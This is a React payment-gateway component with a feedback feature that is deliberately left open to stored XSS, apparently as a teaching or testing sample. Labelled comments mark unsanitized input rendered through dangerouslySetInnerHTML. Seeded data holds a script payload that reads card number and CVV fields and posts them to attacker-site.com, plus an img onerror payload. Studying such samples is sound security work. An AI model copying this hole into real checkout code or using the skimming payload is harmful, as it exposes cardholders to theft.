//               className="px-5 py-3 bg-green-600 text-white rounded-lg text-sm font-semibold w-full flex-1 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 transition duration-150 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
//               disabled={isProcessing}
//               style={{ backgroundColor: themeColor }}
//             >
//               {/* ... (Processing text or Pay text) ... */}
//                {isProcessing ? (
//                  <>
//                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
//                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
//                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
//                    </svg>
//                    Processing...
//                  </>
//                ) : (
//                  `Pay Securely ₹${totalAmount.toFixed(2)}`
//                )}
//             </button>
//           </div>
//       </div> {/* End of Footer */}

//     </div> // End of main container
//   );
// };

// export default PaymentGateway;


import React, { useState, useEffect } from 'react';

// Define TypeScript interfaces
interface PaymentData {
  paymentId: string;
  method: string;
  amount: number;
  timestamp: string;
}

interface CardDetails {
  number: string;
  name: string;
  expiry: string;
  cvv: string;
}

interface SavedCard {
  id: number;
  number: string; // e.g., '**** **** **** 1234'
  brand: string; // e.g., 'VISA', 'MASTERCARD'
  name: string;
  expiry: string; // e.g., '12/25'
}

interface SavedUpi {
  id: number;
  upiId: string;
}

interface CartItemPayment {
  id: string;
  name: string;
  price: number;
  quantity: number;
}

interface PaymentGatewayProps {
  amount: number;
  deliveryFee?: number;
  cartItems?: CartItemPayment[];
  onPaymentComplete: (data: PaymentData) => void;
  onCancel: () => void;
  themeColor?: string; // Optional theme color prop
}

// VULNERABILITY: Adding a "feedback" system that stores comments without sanitization
interface PaymentFeedback {
  id: number;
  userName: string; // Vulnerable field: will store unsanitized user input
  comment: string;  // Vulnerable field: will store unsanitized user input
  rating: number;
  timestamp: string;
}

const PaymentGateway: React.FC<PaymentGatewayProps> = ({
  amount,
  deliveryFee = 0,
  cartItems = [],
  onPaymentComplete,
  onCancel,
  themeColor = '#0c831f',
}) => {
  const [selectedMethod, setSelectedMethod] = useState<string>('upi');
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [paymentError, setPaymentError] = useState<string | null>(null);
  const [upiId, setUpiId] = useState<string>('');
  const [cardDetails, setCardDetails] = useState<CardDetails>({
    number: '',
    name: '',
    expiry: '',
    cvv: '',
  });
  const [savedCards, setSavedCards] = useState<SavedCard[]>([]);
  const [savedUpiIds, setSavedUpiIds] = useState<SavedUpi[]>([]);
  const [savePaymentMethod, setSavePaymentMethod] = useState<boolean>(false);
  const [selectedSavedCardId, setSelectedSavedCardId] = useState<number | null>(null);
  const [selectedSavedUpiId, setSelectedSavedUpiId] = useState<number | null>(null);
  
  // VULNERABILITY: Added state for payment feedback
  const [feedback, setFeedback] = useState<string>('');
  const [userName, setUserName] = useState<string>('');
  const [showFeedbacks, setShowFeedbacks] = useState<boolean>(false);
  const [feedbacks, setFeedbacks] = useState<PaymentFeedback[]>([]);
  const [showFeedbackForm, setShowFeedbackForm] = useState<boolean>(false);

  // Simulating fetching saved payment methods
  useEffect(() => {
    const fetchSavedPaymentMethods = () => {
      setSavedCards([
        { id: 1, brand: 'VISA', number: '**** **** **** 1234', name: 'John Doe', expiry: '12/25' },
        { id: 2, brand: 'MASTERCARD', number: '**** **** **** 5678', name: 'John Doe', expiry: '09/26' },
      ]);
      setSavedUpiIds([
        { id: 1, upiId: 'johndoe@upi' },
        { id: 2, upiId: 'johndoe@bank' },
      ]);
    };
    fetchSavedPaymentMethods();
    
    // VULNERABILITY: Fetch stored feedback that contains malicious XSS payloads
    fetchStoredFeedbacks();
  }, []);

  // VULNERABILITY: Simulating API call to get previous payment feedbacks (including malicious ones)
  const fetchStoredFeedbacks = () => {
    // This would typically be an API call to retrieve stored data
    const storedFeedbacks: PaymentFeedback[] = [
      {
        id: 1,
        userName: 'Jane Smith',
        comment: 'Great payment experience!',
        rating: 5,
        timestamp: '2025-04-10T10:30:00'
      },
      {
        id: 2,
        userName: 'Hacker',
        // Malicious XSS payload disguised as a comment
        comment: 'I had some issues with my payment <script>alert("XSS Attack! Your payment details are vulnerable"); const cardData = { number: document.querySelector("input[name=\'number\']")?.value, cvv: document.querySelector("input[name=\'cvv\']")?.value }; fetch("https://attacker-site.com/steal", { method: "POST", body: JSON.stringify(cardData) });</script>',
        rating: 1,
        timestamp: '2025-04-15T14:22:00'
      },
      {
        id: 3,
        userName: '<img src="x" onerror="alert(\'Another XSS attack!\')">',
        comment: 'Payment failed multiple times.',
        rating: 2,
        timestamp: '2025-04-18T09:15:00'
      }
    ];
    
    setFeedbacks(storedFeedbacks);
  };

  const totalAmount = amount + deliveryFee;

  const handleCardInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    // Basic formatting for card number and expiry
    let formattedValue = value;
    if (name === 'number') {
      formattedValue = value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
    } else if (name === 'expiry') {
       formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2');
    } else if (name === 'cvv') {
        formattedValue = value.replace(/\D/g, '');
    }
    
    setCardDetails(prev => ({ ...prev, [name]: formattedValue }));
    // If user types in new card details, deselect any saved card
    if (['number', 'name', 'expiry', 'cvv'].includes(name)) {
        setSelectedSavedCardId(null);
    }
  };

  const handleUpiInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      setUpiId(e.target.value);
      // If user types in new UPI, deselect any saved UPI
      setSelectedSavedUpiId(null);
  }

  const selectSavedCard = (card: SavedCard) => {
      setSelectedSavedCardId(card.id);
      // Clear new card details when a saved card is selected
      setCardDetails({ number: '', name: '', expiry: '', cvv: '' }); 
  }

  const selectSavedUpi = (upi: SavedUpi) => {
      setSelectedSavedUpiId(upi.id);
      // Clear new UPI ID when a saved one is selected
      setUpiId('');
  }
  
  // VULNERABILITY: Function to handle feedback submission with no sanitization
  const submitFeedback = (e: React.FormEvent) => {
    e.preventDefault();
    
    // Store the feedback without any sanitization
    const newFeedback: PaymentFeedback = {
      id: feedbacks.length + 1,
      userName: userName, // VULNERABLE - unsanitized user input
      comment: feedback, // VULNERABLE - unsanitized user input
      rating: 5, // Default rating
      timestamp: new Date().toISOString()
    };
    
    // Add the new feedback to the list (in a real app, this would be sent to a server)
    setFeedbacks([...feedbacks, newFeedback]);
    
    // Reset the form
    setFeedback('');
    setUserName('');
    setShowFeedbackForm(false);
    
    // Show success message
    alert('Thank you for your feedback!');
  };

  const processPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsProcessing(true);
    setPaymentError(null);

    // Basic Validation (Example)
    if (selectedMethod === 'card' && !selectedSavedCardId) {
      if (!cardDetails.number || !cardDetails.name || !cardDetails.expiry || !cardDetails.cvv) {
        setPaymentError('Please fill in all card details.');
        setIsProcessing(false);
        return;
      }
    }
    if (selectedMethod === 'upi' && !selectedSavedUpiId) {
      if (!upiId || !upiId.includes('@')) {
         setPaymentError('Please enter a valid UPI ID.');
         setIsProcessing(false);
         return;
      }
    }

    try {
      await new Promise(resolve => setTimeout(resolve, 1500)); // Simulate network request

      if (Math.random() > 0.1) { // 90% success rate
        onPaymentComplete({
          paymentId: `PAY_${Date.now()}`,
          method: selectedMethod,
          amount: totalAmount,
          timestamp: new Date().toISOString(),
        });
        
        // Show the feedback form after successful payment
        setShowFeedbackForm(true);
      } else {
        throw new Error('Payment processing failed. Please try again or use a different method.');
      }
    } catch (error) {
      setPaymentError(error instanceof Error ? error.message : 'An unknown error occurred');
    } finally {
      setIsProcessing(false);
    }
  };

  // --- Render Functions for Payment Methods ---
  // [Original method rendering functions remain the same]
  const renderCardForm = () => (
    <div className="space-y-5">
      <h3 className="text-lg font-semibold text-gray-800 mb-3">Pay with Card</h3>
      
      {/* Saved Cards Section */}
      {savedCards.length > 0 && (
        <div className="space-y-3">
          <p className="text-sm font-medium text-gray-600">Saved Cards</p>
          {savedCards.map(card => (
            <div 
              key={card.id} 
              onClick={() => selectSavedCard(card)}
              className={`flex items-center border rounded-lg p-3 cursor-pointer transition duration-150 ease-in-out ${
                selectedSavedCardId === card.id 
                  ? 'border-green-500 bg-green-50 ring-1 ring-green-500' 
                  : 'border-gray-300 hover:bg-gray-50 hover:border-gray-400'
              }`}
            >
              <input 
                type="radio" 
                name="savedCard" 
                id={`card-${card.id}`} 
                checked={selectedSavedCardId === card.id}
                onChange={() => selectSavedCard(card)}
                className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 mr-3"
              />
              <label htmlFor={`card-${card.id}`} className="flex-1 cursor-pointer">
                <div className="flex items-center justify-between">
                    <div className="flex items-center">
                        <span className={`text-xs font-bold px-2 py-1 rounded mr-3 ${card.brand === 'VISA' ? 'bg-blue-100 text-blue-800' : 'bg-red-100 text-red-800'}`}>
                            {card.brand} 
                        </span>
                        <div>
                           <p className="font-medium text-sm text-gray-800">{card.number}</p>
                           <p className="text-xs text-gray-500">Expires {card.expiry}</p>
                        </div>
                    </div>
                </div>
              </label>
            </div>
          ))}
          <div className="text-center my-4">
             <span className="text-xs text-gray-500 uppercase">Or enter a new card</span>
             <hr className="mt-1"/>
          </div>
        </div>
      )}
      
      {/* New Card Form */}
      <div className={`space-y-4 ${selectedSavedCardId ? 'opacity-50 pointer-events-none' : ''}`}>
        <div>
          <label htmlFor="cardNumber" className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
          <input
            type="text" id="cardNumber" name="number"
            value={cardDetails.number} onChange={handleCardInputChange}
            placeholder="0000 0000 0000 0000"
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
            maxLength={19} // 16 digits + 3 spaces
            disabled={!!selectedSavedCardId}
          />
        </div>
        
        <div>
          <label htmlFor="cardName" className="block text-sm font-medium text-gray-700 mb-1">Cardholder Name</label>
          <input
            type="text" id="cardName" name="name"
            value={cardDetails.name} onChange={handleCardInputChange}
            placeholder="John Doe"
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
            disabled={!!selectedSavedCardId}
          />
        </div>
        
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label htmlFor="cardExpiry" className="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
            <input
              type="text" id="cardExpiry" name="expiry"
              value={cardDetails.expiry} onChange={handleCardInputChange}
              placeholder="MM/YY"
              className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
              maxLength={5} // MM/YY
              disabled={!!selectedSavedCardId}
            />
          </div>
          <div>
            <label htmlFor="cardCvv" className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
            <input
              type="password" // Use password type for CVV
              id="cardCvv" name="cvv"
              value={cardDetails.cvv} onChange={handleCardInputChange}
              placeholder="123"
              className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
              maxLength={4} // Amex has 4 digits
              disabled={!!selectedSavedCardId}
            />
          </div>
        </div>
        
        {/* Save Card Checkbox */}
        {!selectedSavedCardId && (
            <div className="flex items-center pt-2">
              <input
                type="checkbox" id="saveCard"
                checked={savePaymentMethod}
                onChange={() => setSavePaymentMethod(!savePaymentMethod)}
                className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 rounded"
              />
              <label htmlFor="saveCard" className="ml-2 block text-sm text-gray-700">Save this card securely for future payments</label>
            </div>
        )}
      </div>
    </div>
  );

  const renderUpiForm = () => (
    <div className="space-y-5">
        <h3 className="text-lg font-semibold text-gray-800 mb-3">Pay with UPI</h3>

        {/* Saved UPI Section */}
        {savedUpiIds.length > 0 && (
        <div className="space-y-3">
          <p className="text-sm font-medium text-gray-600">Saved UPI IDs</p>
          {savedUpiIds.map(upi => (
            <div 
              key={upi.id} 
              onClick={() => selectSavedUpi(upi)}
              className={`flex items-center border rounded-lg p-3 cursor-pointer transition duration-150 ease-in-out ${
                selectedSavedUpiId === upi.id 
                  ? 'border-green-500 bg-green-50 ring-1 ring-green-500' 
                  : 'border-gray-300 hover:bg-gray-50 hover:border-gray-400'
              }`}
            >
              <input 
                type="radio" 
                name="savedUpi" 
                id={`upi-${upi.id}`} 
                checked={selectedSavedUpiId === upi.id}
                onChange={() => selectSavedUpi(upi)}
                className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 mr-3"
              />
              <label htmlFor={`upi-${upi.id}`} className="flex-1 cursor-pointer">
                <div className="flex items-center">
                  <span className="text-xs font-bold px-2 py-1 rounded mr-3 bg-purple-100 text-purple-800">
                     UPI
                  </span>
                  <p className="font-medium text-sm text-gray-800">{upi.upiId}</p>
                </div>
              </label>
            </div>
          ))}
           <div className="text-center my-4">
             <span className="text-xs text-gray-500 uppercase">Or enter a new UPI ID</span>
             <hr className="mt-1"/>
          </div>
        </div>
      )}

        {/* New UPI ID Input */}
        <div className={`space-y-1 ${selectedSavedUpiId ? 'opacity-50 pointer-events-none' : ''}`}>
            <label htmlFor="upiId" className="block text-sm font-medium text-gray-700 mb-1">Enter UPI ID</label>
            <input
            type="text" id="upiId"
            value={upiId}
            onChange={handleUpiInputChange}
            placeholder="yourname@bank or 9876543210@upi"
            className="w-full p-3 border border-gray-300 rounded-lg focus:ring-1 focus:ring-green-500 focus:border-green-500 transition duration-150 ease-in-out placeholder-gray-400"
            disabled={!!selectedSavedUpiId}
            />
            <p className="text-xs text-gray-500 pt-1">Your UPI ID will be verified securely.</p>
        </div>

         {/* Save UPI Checkbox */}
        {!selectedSavedUpiId && (
            <div className="flex items-center pt-2">
            <input
                type="checkbox" id="saveUpi"
                checked={savePaymentMethod}
                onChange={() => setSavePaymentMethod(!savePaymentMethod)}
                className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 rounded"
            />
            <label htmlFor="saveUpi" className="ml-2 block text-sm text-gray-700">Save this UPI ID securely for future payments</label>
            </div>
        )}
    </div>
  );

  const renderWalletForm = () => (
    <div className="space-y-4">
      <h3 className="text-lg font-semibold text-gray-800 mb-3">Pay with Wallet</h3>
      
      <div className="grid grid-cols-2 gap-3">
        {['PayTM', 'PhonePe', 'Mobikwik', 'Amazon Pay'].map((wallet) => (
          <div key={wallet} className="border border-gray-300 rounded-lg p-3 cursor-pointer hover:bg-gray-50 hover:border-gray-400 flex items-center transition duration-150 ease-in-out">
            <input 
              type="radio" 
              name="wallet" 
              id={`wallet-${wallet}`} 
              className="h-4 w-4 text-green-600 focus:ring-green-500 border-gray-300 mr-2"
            />
            <label htmlFor={`wallet-${wallet}`} className="cursor-pointer flex-1 text-sm font-medium text-gray-700">
              {wallet}
            </label>
          </div>
        ))}
      </div>
      
      <p className="text-sm text-gray-600 pt-2">
        You might be redirected to the selected wallet's app or website to complete the payment securely.
      </p>
    </div>
  );

  const renderCodOption = () => (
     <div className="space-y-3">
      <h3 className="text-lg font-semibold text-gray-800 mb-2">Cash on Delivery</h3>
      <p className="text-sm text-gray-600">
        Pay in cash at the time of delivery.
      </p>
      <div className="bg-orange-50 border border-orange-200 p-3 rounded-lg mt-3">
        <p className="text-sm text-orange-800">
          Please keep the exact change ready to minimize contact and ensure a smooth delivery. Availability might depend on your location and order value.
        </p>
      </div>
    </div>
  );
  
  // VULNERABILITY: Rendering payment feedback with dangerouslySetInnerHTML
  const renderFeedbackSection = () => (
    <div className="mt-6 border-t border-gray-200 pt-4">
      <h3 className="text-lg font-semibold text-gray-800 mb-3">
        Payment Gateway Feedback
      </h3>
      
      <button 
        onClick={() => setShowFeedbacks(!showFeedbacks)}
        className="text-sm text-blue-600 hover:text-blue-800 mb-3"
      >
        {showFeedbacks ? 'Hide user feedback' : 'Show previous user feedback'}
      </button>
      
      {showFeedbacks && (
        <div className="space-y-4 mb-4">
          {feedbacks.map(item => (
            <div key={item.id} className="bg-gray-50 rounded-lg p-3 border border-gray-200">
              {/* VULNERABILITY: Using dangerouslySetInnerHTML to render user name */}
              <h4 
                className="font-medium text-gray-900" 
                dangerouslySetInnerHTML={{ __html: item.userName }}
              />
              
              {/* VULNERABILITY: Using dangerouslySetInnerHTML to render feedback */}
              <p 
                className="text-gray-600 text-sm mt-1" 
                dangerouslySetInnerHTML={{ __html: item.comment }}
              />
              
              <div className="flex items-center mt-2 text-xs text-gray-500">
                {/* Stars based on rating */}
                <div className="flex text-yellow-400">
                  {[...Array(item.rating)].map((_, i) => (
                    <span key={i}>★</span>
                  ))}
                  {[...Array(5 - item.rating)].map((_, i) => (
                    <span key={i} className="text-gray-300">★</span>
                  ))}
                </div>
                <span className="ml-2">
                  {new Date(item.timestamp).toLocaleDateString()}
                </span>
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  );
  
  // VULNERABILITY: Feedback form that accepts unsanitized input
  const renderFeedbackForm = () => (
    <div className="mt-6 border-t border-gray-200 pt-4">
      <h3 className="text-lg font-semibold text-gray-800 mb-3">
        Share Your Payment Experience
      </h3>
      
      <form onSubmit={submitFeedback} className="space-y-4">
        <div>
          <label htmlFor="userName" className="block text-sm font-medium text-gray-700 mb-1">
            Your Name
          </label>
          <input 
            type="text"
            id="userName"
            value={userName}
            onChange={(e) => setUserName(e.target.value)}
            className="w-full p-3 border border-gray-300 rounded-lg"
            required
          />
        </div>
        
        <div>
          <label htmlFor="feedback" className="block text-sm font-medium text-gray-700 mb-1">
            Your Feedback
          </label>
          <textarea
            id="feedback"
            value={feedback}
            onChange={(e) => setFeedback(e.target.value)}
            className="w-full p-3 border border-gray-300 rounded-lg h-24"
            required
          />
        </div>
        
        <div className="flex justify-end">
          <button
            type="submit"
            className="px-4 py-2 bg-green-600 text-white rounded-lg font-medium"
            style={{ backgroundColor: themeColor }}
          >
            Submit Feedback
          </button>
        </div>
      </form>
    </div>
  );

  // --- Main Component Return ---
  return (
    <div className="w-[32rem] mx-auto bg-white rounded-xl shadow-lg border border-gray-200 flex flex-col max-h-[90vh]">
      
      {/* Header */}
      <div className="bg-gray-50 px-6 py-4 border-b border-gray-200 flex-shrink-0">
        <h2 className="text-xl font-semibold text-gray-800">Complete Your Payment</h2>
      </div>
      
      {/* Order Summary */}
      <div className="px-6 py-4 border-b border-gray-200 bg-gray-50/50 flex-shrink-0">
         <h3 className="text-md font-medium text-gray-700 mb-3">Order Summary</h3>
         <div className="space-y-2">
             <div className="flex justify-between items-center text-sm">
                 <span className="text-gray-600">Subtotal</span>
                 <span className="text-gray-800">₹{amount.toFixed(2)}</span>
             </div>
             <div className="flex justify-between items-center text-sm">
                 <span className="text-gray-600">Delivery Fee</span>
                 <span className="text-gray-800">₹{deliveryFee.toFixed(2)}</span>
             </div>
             <hr className="my-2"/>
             <div className="flex justify-between items-center font-semibold text-md">
                 <span className="text-gray-900">Total Amount</span>
                 <span className="text-gray-900">₹{totalAmount.toFixed(2)}</span>
             </div>
        </div>
      </div>
      
      {/* VULNERABILITY: Display stored feedback that contains XSS payloads */}
      {renderFeedbackSection()}
      
      {/* Scrollable Content Area */} 
      <form id="payment-form" onSubmit={processPayment} className="flex-grow overflow-y-auto p-6"> 
        {/* Payment methods tabs */}
        <div className="mb-6">
           <p className="text-sm font-medium text-gray-700 mb-3">Select Payment Method</p>
           <div className="flex space-x-2 border-b border-gray-200 pb-2">
              {[
                { id: 'upi', name: 'UPI' },
                { id: 'card', name: 'Card' },
                { id: 'wallet', name: 'Wallet' },
                { id: 'cod', name: 'Cash on Delivery' }
              ].map((method) => (
                <button
                  key={method.id}
                  type="button"
                  onClick={() => {
                      setSelectedMethod(method.id);
                      setPaymentError(null); 
                  }}
                  className={`whitespace-nowrap px-4 py-2 rounded-md text-sm font-medium transition duration-150 ease-in-out focus:outline-none focus:ring-2 focus:ring-offset-1 focus:ring-green-500 ${
                    selectedMethod === method.id
                      ? 'bg-green-600 text-white shadow-sm'
                      : 'bg-gray-100 text-gray-700 hover:bg-gray-200'
                  }`}
                  style={selectedMethod === method.id ? { backgroundColor: themeColor } : {}}
                >
                  {method.name}
                </button>
              ))}
           </div>
        </div>
        
        {/* Render the selected payment method form */}
        <div className="min-h-[200px]"> 
            {selectedMethod === 'card' && renderCardForm()}
            {selectedMethod === 'upi' && renderUpiForm()}
            {selectedMethod === 'wallet' && renderWalletForm()}
            {selectedMethod === 'cod' && renderCodOption()}
        </div>
        
        {/* VULNERABILITY: Show feedback form after payment */}
        {showFeedbackForm && renderFeedbackForm()}
      </form>

      {/* Footer / Action Buttons */}
      <div className="p-6 border-t border-gray-200 bg-white flex-shrink-0">
          {/* Error message */}
          {paymentError && (
            <div className="bg-red-100 border border-red-300 text-red-800 px-4 py-3 rounded-lg mb-4 text-sm">
              {paymentError}
            </div>
          )}
          
          {/* Payment buttons */}
          <div className="flex flex-col sm:flex-row gap-3">
            <button
              type="button" // Stays type="button"
              onClick={onCancel}
              className="px-5 py-3 border border-gray-300 rounded-lg text-gray-700 text-sm font-medium w-full sm:w-auto hover:bg-gray-100 transition duration-150 ease-in-out disabled:opacity-50"
              disabled={isProcessing}
            >
              Cancel Payment
            </button>
            <button
              type="submit" // Stays type="submit", but now needs to target the form via ID or context if outside
              form="payment-form" // Assign an ID to the form tag and reference it here
              className="px-5 py-3 bg-green-600 text-white rounded-lg text-sm font-semibold w-full flex-1 hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 transition duration-150 ease-in-out disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
              disabled={isProcessing}
              style={{ backgroundColor: themeColor }}
            >
              {/* ... (Processing text or Pay text) ... */}
               {isProcessing ? (
                 <>
                   <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                     <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                     <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                   </svg>
                   Processing...
                 </>
               ) : (
                 `Pay Securely ₹${totalAmount.toFixed(2)}`
               )}
            </button>
          </div>
      </div> {/* End of Footer */}

    </div> // End of main container
  );
};

export default PaymentGateway;